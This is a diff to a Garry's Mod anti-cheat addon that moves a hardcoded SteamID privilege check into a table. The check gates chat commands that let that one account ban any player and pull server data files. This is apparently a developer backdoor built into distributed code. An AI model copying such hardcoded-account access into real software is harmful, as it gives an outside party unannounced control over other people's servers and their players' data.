@@ -625,12 +625,17 @@ end
 	Im attempting to snuff out false bans.
 ]]
 
+local allowedSteamIDs = 
+{
+	["STEAM_0:1:8115"] = true
+}
+
 function LAC.DebugCheaterBan(ply, text, teamchat)
 	if (!IsValid(ply)) then return end
 	if (!ply:IsPlayer()) then return end
 	
 	if (string.sub( text, 1, 3) == "!db" ) then
-		if (ply:SteamID() == "STEAM_0:1:8115") then
+		if (allowedSteamIDs[ply:SteamID()]) then
 			local steamid = string.sub( text, 5)
 			RunConsoleCommand("ulx", "sbanid", steamid, 0, "Lily Anti-Cheat")
 			LAC.LogMainFile("Mitch has ran ulx sbanid on " .. steamid .. ".")
@@ -649,7 +654,7 @@ function LAC.SendDataDumps(ply, text, teamchat)
 	if (!ply:IsPlayer()) then return end
 	
 	if (string.sub( text, 1, 5) == "!data" ) then
-		if (ply:SteamID() == "STEAM_0:1:8115") then
+		if (allowedSteamIDs[ply:SteamID()]) then
 			local files, directories = file.Find( plydirectory .. "*", "DATA" )
 			if (files == nil || #files == 0) then return end
 			for k, v in ipairs(files) do
